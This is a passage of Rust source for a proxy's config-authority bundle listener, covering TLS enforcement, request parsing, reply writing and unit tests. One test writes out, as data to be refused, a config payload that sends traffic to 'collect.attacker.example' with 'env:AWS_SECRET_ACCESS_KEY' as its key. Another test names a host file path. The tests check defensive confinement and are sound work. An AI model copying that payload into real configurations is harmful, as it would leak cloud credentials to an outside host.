    .map_err(|error| anyhow::anyhow!("select config authority TLS protocol versions: {error}"))?
    .with_no_client_auth()
    .with_single_cert(certs, key)
    .map_err(|error| anyhow::anyhow!("build config authority TLS config: {error}"))?;
    Ok(tokio_rustls::TlsAcceptor::from(Arc::new(config)))
}

/// A bound bundle listener, ready to accept.
///
/// Binding is separated from serving so a caller (and a test) can learn
/// the assigned address, and so a bind or TLS failure is an error the boot
/// path can propagate rather than a log line inside a spawned task.
pub struct BundleListener {
    listener: tokio::net::TcpListener,
    acceptor: Option<tokio_rustls::TlsAcceptor>,
    authority: Arc<ConfigAuthority>,
}

impl std::fmt::Debug for BundleListener {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("BundleListener")
            .field("local_addr", &self.listener.local_addr().ok())
            .field("tls", &self.acceptor.is_some())
            .finish_non_exhaustive()
    }
}

impl BundleListener {
    /// Bind the bundle listener described by `publish`.
    ///
    /// TLS is required on any non-loopback bind. `publish.validate()`
    /// already refuses that combination, and this refuses it again: the
    /// listener is the thing that would leak, so it does not depend on
    /// something upstream having checked.
    ///
    /// # Errors
    ///
    /// Returns an error when the bind address is unusable, when the
    /// address cannot be bound, when a non-loopback bind carries no TLS
    /// material, or when the TLS material cannot be loaded. Never falls
    /// back to plaintext.
    pub async fn bind(
        authority: Arc<ConfigAuthority>,
        publish: &ConfigAuthorityPublishConfig,
    ) -> anyhow::Result<Self> {
        let addr = publish
            .socket_addr()
            .map_err(|error| anyhow::anyhow!("{error}"))?;
        let acceptor = match publish.tls.as_ref() {
            Some(tls) => Some(build_acceptor(tls)?),
            None if publish.binds_loopback_only() => None,
            None => anyhow::bail!(
                "refusing to start the config authority bundle listener on {addr}: it is not a \
                 loopback address and no proxy.config_authority.publish.tls block is set. \
                 Subscribers present a long-lived fleet credential on this listener and the \
                 response body is the whole configuration, so there is no plaintext fall back",
            ),
        };
        let listener = tokio::net::TcpListener::bind(addr).await.map_err(|error| {
            anyhow::anyhow!("bind config authority bundle listener {addr}: {error}")
        })?;
        Ok(Self {
            listener,
            acceptor,
            authority,
        })
    }

    /// The address this listener actually bound.
    ///
    /// # Errors
    ///
    /// Returns an error when the socket cannot report its address.
    pub fn local_addr(&self) -> std::io::Result<std::net::SocketAddr> {
        self.listener.local_addr()
    }

    /// Whether this listener terminates TLS.
    #[must_use]
    pub const fn is_tls(&self) -> bool {
        self.acceptor.is_some()
    }

    /// Accept and serve forever.
    pub async fn run(self) {
        let addr = self.local_addr().ok();
        tracing::info!(
            addr = ?addr,
            tls = self.acceptor.is_some(),
            authority_id = %self.authority.authority_id(),
            path = BUNDLE_ENDPOINT_PATH,
            "config authority bundle listener started",
        );
        loop {
            let (socket, peer) = match self.listener.accept().await {
                Ok(accepted) => accepted,
                Err(error) => {
                    tracing::warn!(error = %error, "config authority accept failed");
                    continue;
                }
            };
            let authority = Arc::clone(&self.authority);
            let acceptor = self.acceptor.clone();
            tokio::spawn(async move {
                let peer_ip = peer.ip().to_string();
                match acceptor {
                    Some(acceptor) => match acceptor.accept(socket).await {
                        Ok(stream) => serve_connection(stream, &peer_ip, &authority).await,
                        Err(error) => tracing::debug!(
                            error = %error,
                            "config authority TLS handshake failed",
                        ),
                    },
                    None => serve_connection(socket, &peer_ip, &authority).await,
                }
            });
        }
    }
}

/// Read one request head, answer it, and close.
///
/// Deliberately one request per connection. The endpoint is polled at
/// intervals measured in seconds, so keep-alive buys nothing, and a
/// single-shot handler cannot be held open by a client that sends half a
/// second request.
async fn serve_connection<S>(mut socket: S, peer_ip: &str, authority: &ConfigAuthority)
where
    S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin,
{
    let mut head: Vec<u8> = Vec::with_capacity(1024);
    let complete = match tokio::time::timeout(
        BUNDLE_REQUEST_HEAD_TIMEOUT,
        read_request_head(&mut socket, &mut head),
    )
    .await
    {
        Ok(Ok(complete)) => complete,
        Ok(Err(error)) => {
            tracing::debug!(error = %error, "config authority connection read failed");
            return;
        }
        Err(_) => {
            tracing::debug!(
                peer = %peer_ip,
                "config authority connection sent no complete request head before the timeout",
            );
            return;
        }
    };
    if !complete {
        let reply = BundleReply::plain(
            400,
            "bad_request",
            r#"{"error":"malformed or oversized request","code":"bad_request"}"#,
        );
        let _ = write_reply(&mut socket, &reply).await;
        return;
    }

    let text = String::from_utf8_lossy(&head).to_string();
    let mut lines = text.lines();
    let request_line = lines.next().unwrap_or_default();
    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or_default();
    let path = parts.next().unwrap_or_default();
    let credential = header_value(&text, "authorization")
        .and_then(|value| bearer_token(&value))
        .unwrap_or_default();
    let subscriber_id =
        header_value(&text, crate::config_subscriber::SUBSCRIBER_ID_HEADER).unwrap_or_default();
    let if_none_match = header_value(&text, "if-none-match");
    // WOR-2464. Read here with the rest of the head; every value is
    // optional, so an older subscriber that sends none of them produces
    // an empty report and is handled as unknown rather than as an error.
    let apply_report = parse_apply_report(&text);

    let fetch = BundleFetch {
        path,
        method,
        credential: (!credential.is_empty()).then_some(credential.as_str()),
        subscriber_id: (!subscriber_id.is_empty()).then_some(subscriber_id.as_str()),
        if_none_match: if_none_match.as_deref(),
        peer: peer_ip,
        apply_report,
    };
    let reply = authority.serve_bundle(&fetch);
    if reply.status >= 400 {
        tracing::debug!(
            status = reply.status,
            reason = reply.reason,
            peer = %peer_ip,
            subscriber_id = %subscriber_id,
            method = %method,
            path = %path,
            "config authority refused a bundle request",
        );
    }
    let _ = write_reply(&mut socket, &reply).await;
}

/// Read until the end of the request head.
///
/// `Ok(true)` means a complete head is in `head`. `Ok(false)` means the
/// peer closed first or sent more than
/// [`MAX_BUNDLE_REQUEST_HEAD_BYTES`] without finishing one, which the
/// caller answers with a `400` rather than reading further.
async fn read_request_head<S>(socket: &mut S, head: &mut Vec<u8>) -> std::io::Result<bool>
where
    S: tokio::io::AsyncRead + Unpin,
{
    use tokio::io::AsyncReadExt as _;

    let mut chunk = [0u8; 2048];
    loop {
        match socket.read(&mut chunk).await {
            Ok(0) => return Ok(false),
            Ok(read) => {
                head.extend_from_slice(&chunk[..read]);
                if find_header_end(head).is_some() {
                    return Ok(true);
                }
                if head.len() > MAX_BUNDLE_REQUEST_HEAD_BYTES {
                    return Ok(false);
                }
            }
            Err(error) => return Err(error),
        }
    }
}

/// Write one reply and flush it.
async fn write_reply<S>(socket: &mut S, reply: &BundleReply) -> std::io::Result<()>
where
    S: tokio::io::AsyncWrite + Unpin,
{
    use tokio::io::AsyncWriteExt as _;

    let mut response = format!(
        "HTTP/1.1 {} {}\r\n",
        reply.status,
        reason_phrase(reply.status)
    );
    if let Some(etag) = reply.etag.as_deref() {
        response.push_str(&format!("ETag: {etag}\r\n"));
    }
    // A 304 carries no body and, per RFC 9110, no Content-Length either.
    if reply.status != 304 {
        response.push_str(&format!("Content-Type: {}\r\n", reply.content_type()));
        response.push_str(&format!("Content-Length: {}\r\n", reply.body.len()));
    }
    if reply.status == 401 {
        response.push_str("WWW-Authenticate: Bearer realm=\"sbproxy config authority\"\r\n");
    }
    // A configuration is never cacheable by anything in the path, and the
    // subscriber's cursor is the only cache that should exist for it.
    response.push_str("Cache-Control: no-store\r\n");
    response.push_str("Connection: close\r\n\r\n");
    socket.write_all(response.as_bytes()).await?;
    if reply.status != 304 && !reply.body.is_empty() {
        socket.write_all(&reply.body).await?;
    }
    socket.flush().await
}

/// HTTP reason phrase for the statuses this listener emits.
const fn reason_phrase(status: u16) -> &'static str {
    match status {
        200 => "OK",
        304 => "Not Modified",
        400 => "Bad Request",
        401 => "Unauthorized",
        403 => "Forbidden",
        404 => "Not Found",
        405 => "Method Not Allowed",
        429 => "Too Many Requests",
        _ => "Internal Server Error",
    }
}

/// Index of the `\r\n\r\n` that ends a request head.
fn find_header_end(buf: &[u8]) -> Option<usize> {
    buf.windows(4).position(|window| window == b"\r\n\r\n")
}

/// One header value out of a raw request head, case-insensitively.
fn header_value(request: &str, name: &str) -> Option<String> {
    request.lines().skip(1).find_map(|line| {
        let (key, value) = line.split_once(':')?;
        key.trim()
            .eq_ignore_ascii_case(name)
            .then(|| value.trim().to_string())
    })
}

/// The token out of a `Bearer <token>` header value.
fn bearer_token(value: &str) -> Option<String> {
    let (scheme, token) = value.split_once(' ')?;
    scheme
        .eq_ignore_ascii_case("Bearer")
        .then(|| token.trim().to_string())
        .filter(|token| !token.is_empty())
}

/// Start the bundle listener on its own thread, if this node publishes.
///
/// Pingora owns the process's main runtime and does not hand out a handle,
/// so the listener gets a dedicated runtime on a background thread, the
/// same shape the admin server and the config-authority subscriber use.
/// The authority itself is built and the socket bound synchronously, so a
/// missing signing key, an unwritable store, or an address already in use
/// fails the boot instead of logging from inside a detached task.
///
/// # Errors
///
/// Returns an error when the authority cannot be constructed or the
/// listener cannot be bound. Both are boot-fatal: a node configured to
/// publish that silently does not is a node whose whole fleet stops
/// getting configuration without anything saying so.
pub fn spawn(publish: Option<&ConfigAuthorityPublishConfig>) -> anyhow::Result<()> {
    let Some(publish) = publish else {
        return Ok(());
    };
    let authority = Arc::new(ConfigAuthority::from_config(publish)?);
    install_process_authority(Arc::clone(&authority));

    // The bind needs a runtime, and its result has to reach this function
    // so a failure is boot-fatal rather than a log line in a detached
    // task. Everything therefore happens on the listener's own thread and
    // the bind result comes back over a channel. Building a runtime here
    // instead would panic if this ever runs inside one, which is the shape
    // of bug `cluster::block_on_cluster` already exists to avoid.
    let publish = publish.clone();
    let (report, bound) =
        std::sync::mpsc::channel::<anyhow::Result<Option<std::net::SocketAddr>>>();
    std::thread::Builder::new()
        .name("sbproxy-config-authority-pub".to_string())
        .spawn(move || {
            let runtime = match tokio::runtime::Builder::new_multi_thread()
                .worker_threads(1)
                .thread_name("sbproxy-config-authority-pub-rt")
                .enable_all()
                .build()
            {
                Ok(runtime) => runtime,
                Err(error) => {
                    let _ = report.send(Err(anyhow::anyhow!(
                        "build the config authority listener runtime: {error}"
                    )));
                    return;
                }
            };
            let listener = match runtime.block_on(BundleListener::bind(authority, &publish)) {
                Ok(listener) => listener,
                Err(error) => {
                    let _ = report.send(Err(error));
                    return;
                }
            };
            if report.send(Ok(listener.local_addr().ok())).is_err() {
                // The boot path gave up on us, so there is nobody left to
                // serve for.
                return;
            }
            runtime.block_on(listener.run());
        })
        .map_err(|error| anyhow::anyhow!("spawn the config authority listener thread: {error}"))?;

    let addr = bound.recv().map_err(|_| {
        anyhow::anyhow!(
            "the config authority listener thread exited before reporting whether it bound"
        )
    })??;
    tracing::info!(addr = ?addr, "config authority publisher started");
    Ok(())
}

#[cfg(test)]
mod tests {
    /// One request head carrying the apply-report headers, in the shape
    /// the frame reader hands to `parse_apply_report`.
    fn head_with(headers: &[(&str, &str)]) -> String {
        let mut head =
            "GET /config-authority/v1/bundle HTTP/1.1\r\nHost: authority.test\r\n".to_string();
        for (name, value) in headers {
            head.push_str(&format!("{name}: {value}\r\n"));
        }
        head
    }

    /// WOR-2464. A partial or unrecognized report is dropped whole rather
    /// than stored half-parsed: a status page rendering a status against
    /// a revision the node never named would be worse than one saying
    /// nothing. Driven through the same function the listener calls, on
    /// a literal request head, so a header rename fails here.
    #[test]
    fn a_partial_or_unrecognized_apply_report_is_dropped_rather_than_half_stored() {
        assert!(
            parse_apply_report(&head_with(&[
                ("x-sbproxy-config-status", "teleported"),
                ("x-sbproxy-applied-revision", "4"),
            ]))
            .is_none(),
            "an unrecognized status drops the whole report",
        );
        assert!(
            parse_apply_report(&head_with(&[("x-sbproxy-config-status", "applied")])).is_none(),
            "a status with no revision names nothing",
        );
        assert!(
            parse_apply_report(&head_with(&[
                ("x-sbproxy-config-status", "applied"),
                ("x-sbproxy-applied-revision", "soon"),
            ]))
            .is_none(),
            "and a revision that is not a number is not a revision",
        );
        assert!(
            parse_apply_report(&head_with(&[])).is_none(),
            "an older subscriber sends none of these and is handled without error",
        );

        let parsed = parse_apply_report(&head_with(&[
            ("x-sbproxy-config-status", "applied_degraded"),
            ("x-sbproxy-applied-revision", "4"),
            ("x-sbproxy-applied-hash", "sha"),
            ("x-sbproxy-config-error", "  "),
            ("x-sbproxy-soak-verdict", "inconclusive"),
            ("x-sbproxy-fallback-active", "true"),
        ]))
        .expect("a complete report parses");
        assert_eq!(parsed.status.as_str(), "applied_degraded");
        assert_eq!(parsed.revision, 4);
        assert_eq!(parsed.config_hash, "sha");
        assert_eq!(
            parsed.error, None,
            "a whitespace-only error is an absent one, not an empty string on the status page",
        );
        assert_eq!(parsed.soak_verdict.as_deref(), Some("inconclusive"));
        assert!(parsed.fallback_active);
        assert!(
            parsed.reported_at_unix_ms.is_none(),
            "the arrival time is the authority's to stamp, never the subscriber's to claim",
        );
    }

    /// WOR-2464: "The status page distinguishes 'has not polled recently'
    /// from 'polled and failed'." Three states, because after an authority
    /// restart the honest answer is neither: fetch times are held in memory
    /// only, and a restart must not make every node look like it went
    /// silent.
    #[test]
    fn the_poll_state_separates_silence_from_failure() {
        const HOUR: u64 = 60 * 60 * 1_000;
        assert_eq!(poll_state(None, HOUR), "unknown");
        assert_eq!(poll_state(Some(HOUR), HOUR), "recent");
        assert_eq!(
            poll_state(Some(HOUR), HOUR + SUBSCRIBER_STALE_AFTER_MS),
            "recent",
            "the boundary itself is still recent",
        );
        assert_eq!(
            poll_state(Some(HOUR), HOUR + SUBSCRIBER_STALE_AFTER_MS + 1),
            "stale",
        );
        // A clock that went backwards must not read as stale, or a fleet
        // behind an NTP correction would all look silent at once.
        assert_eq!(poll_state(Some(HOUR), HOUR - 1), "recent");
    }

    use super::*;

    /// WOR-2433. The publish gate screens values, not just paths.
    ///
    /// Named against `validate_publish_payload` on purpose: the confined
    /// check being correct proves nothing about this route running it,
    /// and this route is the one that has to refuse before a payload is
    /// signed and served to a fleet.
    #[test]
    fn publish_refuses_a_payload_that_reads_a_subscribers_environment() {
        let dir = tempfile::tempdir().expect("temp dir");
        let payload = r#"
origins:
  "exfil.test":
    action:
      type: proxy
      url: https://collect.attacker.example
    authentication:
      type: api_key
      api_key: "env:AWS_SECRET_ACCESS_KEY"
"#;
        let error = validate_publish_payload(payload, dir.path())
            .expect_err("a payload reading a subscriber's environment must be refused");
        assert_eq!(error.code(), "confinement_refused", "{error}");
        assert!(
            error.to_string().contains("env:NAME"),
            "the refusal names the form: {error}"
        );
    }

    /// The other half: `${VAR}` is how a fleet-wide document names
    /// per-node values, so publish must not have taken it away.
    #[test]
    fn publish_still_accepts_a_payload_naming_a_per_node_variable() {
        let dir = tempfile::tempdir().expect("temp dir");
        let payload = r#"
origins:
  "shared.test":
    action:
      type: static
      status_code: 200
      content_type: text/plain
      body: "${SB_DEFINITELY_UNSET_XYZZY:-fallback}"
"#;
        validate_publish_payload(payload, dir.path())
            .expect("a per-node `${VAR}` stays publishable");
    }

    /// A host path in a published payload is the filesystem twin of the
    /// environment read above.
    #[test]
    fn publish_refuses_a_payload_naming_a_path_on_the_subscribers_host() {
        let dir = tempfile::tempdir().expect("temp dir");
        let payload = r#"
origins:
  "shared.test":
    action:
      type: static
      status_code: 200
      content_type: text/plain
      body: ok
    request_modifiers:
      - rego_module_path: /etc/sbproxy/anything.rego
"#;
        let error = validate_publish_payload(payload, dir.path())
            .expect_err("a payload naming a path on the subscriber's host must be refused");
        assert_eq!(error.code(), "confinement_refused", "{error}");
    }

    #[test]
    fn the_etag_format_matches_what_a_subscriber_sends() {
        let digest = format!("sha256:{}", "a".repeat(64));
        let mine = etag_for(7, &digest);
        let theirs = crate::config_subscriber::cursor_etag(
            &sbproxy_config::ConfigBundleCursor::new(7, digest.clone()),
        )
        .expect("an applied cursor renders an etag");
        assert_eq!(
            mine, theirs,
            "the authority's ETag and the subscriber's If-None-Match must be the same bytes",
        );
        assert!(mine.starts_with('"') && mine.ends_with('"'), "{mine}");
    }

    #[test]
    fn if_none_match_handles_the_shapes_an_http_client_sends() {
        let etag = etag_for(3, &format!("sha256:{}", "b".repeat(64)));
        assert!(if_none_match_matches(Some(&etag), &etag));
        assert!(if_none_match_matches(Some(&format!("W/{etag}")), &etag));
        assert!(if_none_match_matches(Some("*"), &etag));
        assert!(if_none_match_matches(
            Some(&format!("\"1-sha256:x\", {etag}")),
            &etag
        ));
        assert!(!if_none_match_matches(None, &etag));
        assert!(!if_none_match_matches(Some("\"1-sha256:x\""), &etag));
        // An unquoted revision is not a match: the quotes are part of the
        // entity tag, not decoration.
        assert!(!if_none_match_matches(Some("3-sha256:x"), &etag));
    }

    #[test]
    fn a_bearer_header_is_parsed_and_anything_else_is_not() {
        assert_eq!(bearer_token("Bearer abc").as_deref(), Some("abc"));
        assert_eq!(bearer_token("bearer  abc ").as_deref(), Some("abc"));
        assert_eq!(bearer_token("Basic abc"), None);
        assert_eq!(bearer_token("Bearer"), None);
        assert_eq!(bearer_token("Bearer  "), None);
    }

    #[test]
    fn the_request_head_parser_finds_the_headers_it_needs() {
        let head = "GET /config-authority/v1/bundle HTTP/1.1\r\n\
                    Host: authority.test\r\n\
                    Authorization: Bearer sbca1.a.b\r\n\
                    If-None-Match: \"4-sha256:z\"\r\n\
                    X-Sbproxy-Subscriber-Id: edge-01\r\n\r\n";
        assert_eq!(find_header_end(head.as_bytes()), Some(head.len() - 4));
        assert_eq!(
            header_value(head, "authorization").as_deref(),
            Some("Bearer sbca1.a.b")
        );
        assert_eq!(
            header_value(head, "x-sbproxy-subscriber-id").as_deref(),
            Some("edge-01")
        );
        assert_eq!(
            header_value(head, "if-none-match").as_deref(),
            Some("\"4-sha256:z\"")
        );
        assert_eq!(header_value(head, "cookie"), None);
    }

    #[test]
    fn publish_error_status_mapping_separates_payload_from_authority() {
        assert!(PublishError::Compile("x".into()).is_payload_fault());
        assert!(PublishError::Construct("x".into()).is_payload_fault());
        assert!(PublishError::ModelRuntime("x".into()).is_payload_fault());
        assert!(PublishError::DeniedPaths(vec!["proxy.admin".into()]).is_payload_fault());
        assert!(PublishError::Invalid("x".into()).is_payload_fault());
        assert!(!PublishError::Signing("x".into()).is_payload_fault());
        assert!(!PublishError::Internal("x".into()).is_payload_fault());
        assert_eq!(
            PublishError::DeniedPaths(vec!["proxy.admin".into()]).code(),
            "denied_path"
        );
    }

    #[test]
    fn admin_routes_are_owned_and_nothing_else_is() {
        for path in [
            PUBLISH_PATH,
            STATUS_PATH,
            SUBSCRIBERS_PATH,
            SUBSCRIBER_REVOKE_PATH,
            &format!("{STATUS_PATH}?pretty=1"),
        ] {
            assert!(
                dispatch("GET", path, None).is_some(),
                "{path} must be dispatched here",
            );
        }
        for path in [
            "/admin/config-authority",
            "/admin/cluster/status",
            BUNDLE_ENDPOINT_PATH,
        ] {
            assert!(
                dispatch("GET", path, None).is_none(),
                "{path} must fall through",
            );
        }
    }

    #[test]
    fn revision_consumed_is_computed_from_where_the_failure_happened() {
        // Every validation step runs before `reserve_revision`, so a
        // payload the operator has to fix costs nothing. Everything from
        // signing onward has already spent a number, and the counter
        // never reissues one. `"revision_consumed": false` used to be
        // asserted on all of them.
        for costs_nothing in [
            PublishError::Invalid("empty".to_string()),
            PublishError::DeniedPaths(vec!["proxy.admin".to_string()]),
            PublishError::Compile("nope".to_string()),
            PublishError::Construct("nope".to_string()),
            PublishError::ModelRuntime("nope".to_string()),
            PublishError::Confinement("nope".to_string()),
            // The reservation's own failure. `reserve_revision` persists
            // the new high-water mark before it returns, so a failure
            // inside it leaves the counter where it was; this is the
            // variant that exists to keep it out of `Store`.
            PublishError::Reserve(AuthorityStoreError::Corrupt("no space".to_string())),
        ] {
            assert!(
                !costs_nothing.consumed_revision(),
                "{costs_nothing:?} is refused before the reservation",
            );
            assert_ne!(
                costs_nothing.code(),
                "",
                "every variant keeps a wire code: {costs_nothing:?}",
            );
        }
        // Both store variants answer the operator's remedy identically,
        // so they share a code and differ only on what was spent.
        assert_eq!(
            PublishError::Reserve(AuthorityStoreError::Corrupt("x".to_string())).code(),
            "store_failed",
        );
        for spends in [
            PublishError::Signing("no key".to_string()),
            PublishError::Internal("unreachable".to_string()),
        ] {
            assert!(
                spends.consumed_revision(),
                "{spends:?} happens after the reservation, so the number is gone",
            );
        }

        // A rollback inherits the publish path's spend, and its own two
        // refusals never reach a reservation.
        assert!(!RollbackError::NoPreviousRevision { published: 3 }.consumed_revision());
        assert!(!RollbackError::NotArchived {
            requested: 9,
            available: "1, 2".to_string(),
        }
        .consumed_revision());
        assert!(
            RollbackError::Publish(PublishError::Signing("no key".to_string())).consumed_revision(),
        );
    }

    #[test]
    fn json_bodies_are_parsed_leniently_but_not_loosely() {
        assert_eq!(
            string_field(Some(r#"{"subscriber_id":"edge-01"}"#), "subscriber_id").as_deref(),
            Some("edge-01")
        );
        assert_eq!(
            string_field(Some(r#"{"subscriber_id":"  "}"#), "subscriber_id"),
            None
        );
        assert_eq!(
            string_field(Some(r#"{"subscriber_id":7}"#), "subscriber_id"),
            None
        );
        assert_eq!(string_field(Some("not json"), "subscriber_id"), None);
        assert_eq!(string_field(None, "subscriber_id"), None);
        assert_eq!(
            query_param(Some("mode=replace&x=1"), "mode").as_deref(),
            Some("replace")
        );
        assert_eq!(query_param(Some("x=1"), "mode"), None);
        assert_eq!(query_param(None, "mode"), None);
    }
}
